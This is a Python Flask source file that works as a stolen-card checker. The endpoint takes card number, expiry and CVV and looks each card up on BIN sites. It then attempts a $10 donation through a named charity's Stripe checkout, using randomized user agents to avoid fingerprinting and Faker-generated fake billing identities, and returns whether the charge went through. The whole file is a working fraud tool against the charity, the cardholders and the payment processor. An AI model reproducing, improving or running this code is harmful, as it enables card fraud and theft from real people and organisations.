from flask import Flask, request
import requests
import re
import json
import random
from faker import Faker

app = Flask(__name__)
fake = Faker()

def get_random_bin_info(cc_bin):
    """Randomizes between different BIN lookup providers."""
    providers = [
        f"https://bins.antipublic.cc/bins/{cc_bin}",
        f"https://lookup.binlist.net/{cc_bin}"
    ]
    try:
        url = random.choice(providers)
        res = requests.get(url, timeout=5)
        return res.json()
    except Exception:
        return {"error": "BIN lookup failed"}

def process_payment(card_details):
    try:
        cc, mm, yy, cvv = [i.strip() for i in card_details.split('|')]
    except ValueError:
        return {"error": "Invalid card format. Use cc|mm|yy|cvv"}

    # --- RANDOMIZED BIN LOOKUP ---
    bin_info = get_random_bin_info(cc[:6])

    session = requests.Session()

    # STEP 1: Create Checkout Session
    # Randomized User-Agent to avoid fingerprinting
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
    ]
    
    headers_init = {
        'User-Agent': random.choice(user_agents),
        'Accept': '*/*',
        'Referer': 'https://www.g-act.org/donate',
        'Content-Type': 'application/json',
        'Origin': 'https://www.g-act.org',
    }
    payload_init = {'amount': 10, 'frequency': 'once'}
    
    try:
        res_init = session.post('https://www.g-act.org/api/create-checkout-session', 
                                headers=headers_init, json=payload_init)
        checkout_url = res_init.json().get('url')
    except Exception:
        return {"error": "Connection to merchant failed"}

    if not checkout_url:
        return {"error": "Failed to generate checkout URL", "bin_data": bin_info}

    # STEP 2: Extract Session ID and Public Key
    sid_match = re.search(r'(cs_live_[a-zA-Z0-9]+)', checkout_url)
    session_id = sid_match.group(1)

    res_page = session.get(checkout_url, headers={'User-Agent': headers_init['User-Agent']})
    pk_match = re.search(r'"apiKey":"(pk_live_[a-zA-Z0-9]+)"', res_page.text)
    pk_key = pk_match.group(1) if pk_match else "pk_live_51RVLHOJ5z2fZfU4QNVgH5Q1snrnRPyiHMbT1WByUpNSR0UJkmCx0QCARkIVEJ9gFe0pxt8EoOwl9GunSGl0IXBJg00DuhRfw1J"

    # STEP 3: Sync with Elements
    params = {'key': pk_key, 'type': 'deferred_intent', 'checkout_session_id': session_id}
    res_el = session.get('https://api.stripe.com/v1/elements/sessions', 
                         headers={'User-Agent': headers_init['User-Agent']}, params=params)
    amount_to_confirm = res_el.json().get('deferred_intent', {}).get('amount', 1000)

    # STEP 4: Create Payment Method with RANDOMIZED INFO
    pm_headers = {
        'User-Agent': headers_init['User-Agent'],
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://checkout.stripe.com/',
        'Origin': 'https://checkout.stripe.com',
    }
    
    # Using Faker to randomize billing details
    pm_data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'billing_details[name]': fake.name(),
        'billing_details[email]': fake.free_email(),
        'billing_details[address][country]': 'US', # Common for Stripe, or use fake.country_code()
        'billing_details[address][line1]': fake.street_address(),
        'billing_details[address][city]': fake.city(),
        'billing_details[address][postal_code]': fake.zipcode(),
        'key': pk_key,
        'payment_user_agent': 'stripe.js/914978d831; stripe-js-v3/914978d831; checkout',
        'client_attribution_metadata[checkout_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'checkout',
        'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
    }
    
    res_pm = session.post('https://api.stripe.com/v1/payment_methods', headers=pm_headers, data=pm_data)
    pm_id = res_pm.json().get('id')

    if not pm_id:
        final_out = res_pm.json()
        final_out["bin_data"] = bin_info
        return final_out

    # STEP 5: Final Confirmation
    confirm_url = f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm'
    confirm_data = {
        'payment_method': pm_id,
        'expected_amount': amount_to_confirm,
        'key': pk_key,
        'client_attribution_metadata[checkout_session_id]': session_id
    }
    res_final = session.post(confirm_url, headers=pm_headers, data=confirm_data)
    
    final_response = res_final.json()
    final_response["bin_data"] = bin_info
    
    return final_response

@app.route('/')
def index():
    cc_details = request.args.get('cc')
    if not cc_details:
        return "Usage: 0.0.0.0:6969?cc=number|mm|yy|cvv"
    
    result = process_payment(cc_details)
    return result

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=6969)
